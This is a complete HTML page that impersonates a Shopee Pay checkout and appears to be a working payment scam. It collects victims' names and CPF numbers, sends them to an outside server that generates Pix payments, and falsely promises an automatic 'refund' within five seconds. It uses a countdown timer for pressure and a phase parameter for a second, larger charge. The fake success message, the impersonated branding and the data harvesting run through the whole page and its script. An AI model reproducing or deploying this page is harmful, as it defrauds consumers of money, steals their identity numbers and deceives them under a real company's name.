<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Checkout Seguro | Shopee Pay</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    
    <style>
        :root { --shopee-orange: #ee4d2d; --shopee-bg: #f5f5f5; }
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Roboto', sans-serif; background-color: var(--shopee-bg); margin: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { background: white; width: 100%; max-width: 480px; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
        
        .header { background: white; padding: 15px 20px; border-bottom: 1px solid #e8e8e8; display: flex; align-items: center; gap: 10px; }
        .header h1 { font-size: 18px; color: var(--shopee-orange); margin: 0; font-weight: 500; }
        .shield-icon { width: 20px; height: 20px; fill: var(--shopee-orange); }

        .content { padding: 20px; flex: 1; }

        .price-display {
            text-align: center;
            font-size: 28px;
            font-weight: bold;
            color: var(--shopee-orange);
            margin: 20px 0;
            background: #fff5f1;
            padding: 15px;
            border-radius: 8px;
            border: 1px dashed var(--shopee-orange);
        }

        .trust-box { background: #f8f8f8; padding: 12px; border-radius: 4px; display: flex; align-items: center; gap: 10px; margin-bottom: 20px; font-size: 13px; color: #555; }
        
        label { font-size: 14px; color: #333; margin-bottom: 6px; display: block; font-weight: 500; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; margin-bottom: 15px; transition: 0.3s; }
        input:focus { border-color: var(--shopee-orange); }

        .btn-primary { background-color: var(--shopee-orange); color: white; width: 100%; padding: 14px; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; text-transform: uppercase; cursor: pointer; margin-top: 10px; box-shadow: 0 2px 4px rgba(238, 77, 45, 0.2); }
        .btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }

        #result-area { display: none; text-align: center; margin-top: 20px; }
        .qr-img { width: 220px; margin: 0 auto 15px; display: block; border: 1px solid #eee; border-radius: 8px; }
        .pix-code-box { background: #f8f8f8; padding: 10px; border: 1px dashed #ccc; border-radius: 4px; font-size: 12px; color: #555; word-break: break-all; margin-bottom: 10px; }
        .btn-outline { background: white; color: var(--shopee-orange); border: 1px solid var(--shopee-orange); padding: 10px; width: 100%; border-radius: 4px; font-weight: 500; cursor: pointer; }
        
        .timer-box { text-align: center; margin-top: 20px; font-size: 14px; color: #d0011b; font-weight: 500; }
        
        .status-sucesso { display: none; margin-top: 15px; padding: 15px; background: #dff0d8; color: #3c763d; border-radius: 4px; font-weight: bold; text-align: center; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <svg class="shield-icon" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            <h1>Pagamento Seguro</h1>
        </div>

        <div class="content">
            
            <div class="price-display" id="display-valor">R$ --,--</div>

            <div class="trust-box">
                <p>ðŸ”’ <strong>Garantia Shopee:</strong> O valor serÃ¡ estornado para sua conta em 5 segundos apÃ³s a confirmaÃ§Ã£o.</p>
            </div>

            <div id="form-area">
                <label>Nome Completo</label>
                <input type="text" id="nome" placeholder="Nome do titular da conta">
                
                <label>CPF (Apenas nÃºmeros)</label>
                <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)">

                <button class="btn-primary" onclick="gerarPix()" id="btn-pagar">GERAR PIX AGORA</button>
            </div>

            <div id="result-area">
                <p>Escaneie o QR Code abaixo:</p>
                <img id="qr-image" class="qr-img" src="" alt="QR Code">
                <div class="pix-code-box" id="pix-code"></div>
                <button class="btn-outline" onclick="copiarCodigo()">Copiar CÃ³digo Pix</button>

                <div class="status-sucesso" id="msg-sucesso">
                    âœ… PAGAMENTO APROVADO!<br>
                    <span style="font-size:12px; font-weight:normal;">Reembolso enviado com sucesso.</span>
                </div>
            </div>

            <div class="timer-box" id="timer-display">
                Oferta expira em: <span id="time">05:00</span>
            </div>
        </div>
    </div>

    <script>
        const API_URL = "https://checkout-pix-profissional.onrender.com";

        // --- LÃ“GICA AUTOMÃTICA DE VALORES ---
        const params = new URLSearchParams(window.location.search);
        const fase = params.get("fase");
        
        // Define o valor baseado no link (?fase=1 ou ?fase=2)
        let valorAtual = 37.90; // Valor PadrÃ£o (Fase 1)
        
        if (fase === "2") {
            valorAtual = 47.90; // Fase 2
        }

        // Atualiza a tela com o valor correto
        document.getElementById("display-valor").innerText = "R$ " + valorAtual.toFixed(2).replace(".", ",");
        document.getElementById("btn-pagar").innerText = `PAGAR R$ ${valorAtual.toFixed(2).replace(".", ",")}`;

        // --- FUNÃ‡Ã•ES ---

        function mascaraCPF(i) {
            let v = i.value.replace(/\D/g, "");
            if (v.length > 11) v = v.slice(0, 11);
            i.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
        }

        async function gerarPix() {
            const nome = document.getElementById('nome').value;
            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
            const btn = document.getElementById('btn-pagar');

            if (nome.length < 3 || cpf.length < 11) {
                alert("Por favor, preencha Nome e CPF corretamente para o estorno funcionar.");
                return;
            }

            btn.disabled = true;
            btn.innerText = "GERANDO...";

            try {
                const res = await fetch(`${API_URL}/pix`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        amount: valorAtual, // Usa o valor automÃ¡tico da fase
                        name: nome,
                        cpf: cpf
                    })
                });
                
                const data = await res.json();

                if (data.point_of_interaction) {
                    const qr = data.point_of_interaction.transaction_data;
                    
                    document.getElementById('qr-image').src = `data:image/png;base64,${qr.qr_code_base64}`;
                    document.getElementById('pix-code').innerText = qr.qr_code;
                    
                    document.getElementById('form-area').style.display = 'none';
                    document.getElementById('result-area').style.display = 'block';

                    iniciarTimer();
                    monitorarPagamento(data.id);
                } else {
                    alert("Erro ao gerar Pix. Verifique os dados.");
                    btn.disabled = false;
                    btn.innerText = "TENTAR NOVAMENTE";
                }
            } catch (error) {
                alert("Erro de conexÃ£o.");
                btn.disabled = false;
            }
        }

        function monitorarPagamento(id) {
            const intervalo = setInterval(async () => {
                try {
                    const res = await fetch(`${API_URL}/pix/${id}`);
                    const json = await res.json();

                    if (json.status === 'approved') {
                        clearInterval(intervalo);
                        document.getElementById('msg-sucesso').style.display = 'block';
                        document.getElementById('timer-display').style.color = "green";
                        document.getElementById('timer-display').innerHTML = "<b>ESTORNO ENVIADO! ðŸš€</b>";
                        
                        // SE QUISER REDIRECIONAR AUTOMATICAMENTE PARA A PRÃ“XIMA FASE:
                        // if (fase !== "2") {
                        //     setTimeout(() => window.location.href = "LINK_DA_FASE_2", 3000);
                        // }
                    }
                } catch (e) {}
            }, 3000);
        }

        function iniciarTimer() {
            let duration = 300; // 5 minutos
            const display = document.querySelector('#time');
            const timer = setInterval(() => {
                let m = parseInt(duration / 60, 10);
                let s = parseInt(duration % 60, 10);
                display.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
                if (--duration < 0) clearInterval(timer);
            }, 1000);
        }

        function copiarCodigo() {
            navigator.clipboard.writeText(document.getElementById('pix-code').innerText);
            alert("CÃ³digo copiado!");
        }
    </script>
</body>
</html>
